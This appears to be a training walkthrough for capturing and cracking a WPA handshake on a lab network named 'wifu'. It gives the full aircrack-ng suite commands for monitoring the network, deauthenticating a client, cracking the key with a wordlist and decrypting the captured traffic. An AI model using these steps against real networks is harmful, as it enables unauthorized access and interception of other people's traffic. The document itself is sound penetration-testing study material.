# Cracking Auth Hash

we need to capture a WPA 4-way handshake between the AP and a real client.

After putting our wlan0 interface in monitor mode, we now have an interface called wlan0mon. We will identify the channel of the target AP and gather its BSSID to limit our capture with airodump-ng.

```
sudo airodump-ng wlan0mon
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Let's update our airodump-ng command to incorporate this information and save the packets to a capture file. It is critical that we are on the same channel as the AP. If we're not, our attempts to deauthenticate the client and capture the handshake will likely fail.

```
sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
```

With airodump-ng now saving packets to a file (the initial execution outputs to **wpa-01.\***, the second to **wpa-02.\***, etc.), we'll use **aireplay-ng** to deauthenticate, or disconnect, the target AP and its connected client.

```
sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
```

Now that we have captured a handshake, cracking it is relatively easy. We run **aircrack-ng** against our recently created capture file, **wpa-01.cap**. We'll use a list of commonly used passwords

```
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```

To confirm the key is correct, let's decrypt our traffic with **airdecap-ng**.

```
airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

